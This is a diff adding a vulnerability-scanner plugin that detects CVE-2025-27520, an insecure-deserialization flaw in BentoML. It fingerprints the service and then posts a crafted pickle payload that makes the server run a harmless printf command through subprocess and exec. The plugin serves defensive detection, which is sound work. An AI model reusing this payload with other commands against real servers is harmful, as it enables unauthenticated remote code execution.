@@ -1,0 +1,100 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "BentoML_CVE_2025_27520"
+  author: "dyeddala"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2025-27520"
+  }
+  severity: CRITICAL
+  title: "BentoML Insecure Deserialization - Endpoint Check (CVE-2025-27520)"
+  description: "An insecure deserialization vulnerability exists in BentoML prior to version 1.4.3 within serde.py, allowing unauthenticated remote code execution (RCE). This check fingerprints the BentoML service and verifies whether the endpoint accepts and deserializes application/vnd.bentoml+pickle payloads. It executes the command `printf %x 133713371337`."
+  recommendation: "Update BentoML to version 1.4.3 or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2025-27520"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_bentoml"
+  http_request: {
+    method: GET
+    uri: "/docs.json"
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: [
+          {
+            body: {}
+            contains: "BentoML"
+          },
+          {
+            body: {}
+            contains: "bentoml"
+          }
+        ]
+      }
+      extract_any: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"/([a-zA-Z0-9_-]+)\":\\s*\\{\\s*\"post\":"
+            variable_name: "endpoint"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "check_bentoml_endpoint"
+  http_request: {
+    method: POST
+    uri: "/{{ endpoint }}"
+    headers: [
+      { name: "Content-Type" value: "application/vnd.bentoml+pickle" }
+    ]
+    data: "(dp0\nVoutput\np1\nc__builtin__\nexec\np2\n(Vfrom pydantic import ValidationError\\u000araise ValidationError(__import__('subprocess').check_output('printf %x 133713371337', shell=True), [])\np3\ntp4\nRp5\ns."
+    response: {
+      http_status: 400
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "b'1f21f020c9'"
+          }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprint_bentoml",
+    "check_bentoml_endpoint"
+  ]
+}
